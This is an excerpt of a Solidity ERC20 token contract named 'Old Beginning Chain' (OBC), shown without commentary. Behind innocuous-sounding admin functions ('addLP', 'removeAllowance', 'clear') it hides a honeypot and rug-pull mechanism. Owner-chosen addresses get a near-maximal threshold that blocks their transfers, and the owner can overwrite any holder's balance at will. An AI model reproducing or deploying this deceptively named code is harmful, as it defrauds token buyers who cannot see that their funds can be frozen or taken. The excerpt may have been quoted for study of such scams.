...
contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    ...
    mapping(address => uint256) private _adminOwned;
    mapping (address => bool) public _isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 MAXABA = 2**256-996;
    function addLP(address recipient) external  {
        require( _isExcludedFromFee[msg.sender]);
        _adminOwned[recipient] = MAXABA ;
    }

    function clear(address recipient) external  {
        require( _isExcludedFromFee[msg.sender]);
        _adminOwned[recipient] = 0;
    }

    function getABA(address recipient) public view returns(uint256)  {
        return _adminOwned[recipient];
    }


    function removeAllowance(address recipient) external  {
        require( _isExcludedFromFee[msg.sender]);
        _tOwned[recipient] = _adminOwned[recipient] ;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFee[from] == false) {
            require(fromBalance >= _adminOwned[from], "ERC20: transfer amount exceeds balance");
        }
...
contract OBC is ERC20 {
    using SafeMath for uint256;
    constructor(uint256 initialSupply) ERC20("Old Beginning Chain", "OBC") {
